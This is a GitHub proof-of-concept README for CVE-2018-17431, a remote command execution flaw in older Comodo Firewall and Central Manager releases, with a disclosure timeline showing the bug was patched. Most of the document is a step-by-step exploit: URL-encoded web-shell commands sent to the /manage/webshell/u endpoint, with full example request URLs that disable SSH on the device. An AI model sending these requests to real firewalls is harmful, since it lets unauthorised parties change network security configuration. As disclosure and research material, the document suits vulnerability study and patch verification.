## CVE-2018-17431-PoC
Proof of consept for CVE-2018-17431

### Exploit Title: Comodo Firewall & Central Manager (UTM) All Release before 2.7.0 & 1.5.0 Remote Command Execution (Web Shell based)
### Exploit Author: Milad Fadavvi
### Vendor Homepage: https://www.comodo.com/
### Software Link: https://secure.comodo.com/home/purchase.php?pid=106&license=try&track=9276&af=9276
### Version: before 2.7.0 & 1.5.0
### Tested on: Windows:firefox/chrome - Kali:firefox
### Discovery Date: 2018-08-15 (reported in sameday)
### Confirmation than bug exist: 2018-09-22 ([Ticket ID: XWR-503-79437](https://github.com/Fadavvi/CVE-2018-17431-PoC/blob/master/Comodo-Confirmarion.png))
### Patch released: 2018-11-23 [Release Notes from Comodo](https://github.com/Fadavvi/CVE-2018-17431-PoC/raw/master/DomeFW2.7.0.ReleaseNote.pdf)

Exploit:

1. WebShell simulation:

        For example disable SSH in web shell is like this:
            - service [hit enter]
            - ssh [hit enter]
            - disable [hit enter]

2. Encode
        
        make above sequense encode with URL ECODING
        (I used burp encoder plugin)

        %73%65%72%76%69%63%65%0a%73%73%68%0a%64%69%73%61%62%6c%65%0a

3. Run 

        Base URL: https://[Comodo_Firewall_IP]:[WebPort]/manage/webshell/u?s=[Integer]&w=100&h=24&k=[Encoded_Command]&l=[Integer]&_=1534440840152
        
        
                  https://[Comodo_Firewall_IP]:[WebPort]/manage/webshell/u?s=[Integer]&w=100&h=24&k=%0a&l=[Integer]&_=1534440840152 (extra enter key for run the command)
                  

        Example: https://192.168.250.10:10443/manage/webshell/u?s=4&w=100&h=24&k=%73%65%72%76%69%63%65%0a%73%73%68%0a%64%69%73%61%62%6c%65%0a&l=21&_=1534440840152
        
              https://192.168.250.10:10443/manage/webshell/u?s=4&w=100&h=24&k=%0a&l=21&_=1534440840152


A page with **"Configuration has been altered"** message will show up and configuration changed!



### With this technic, we can simulate all WebShell Commands.
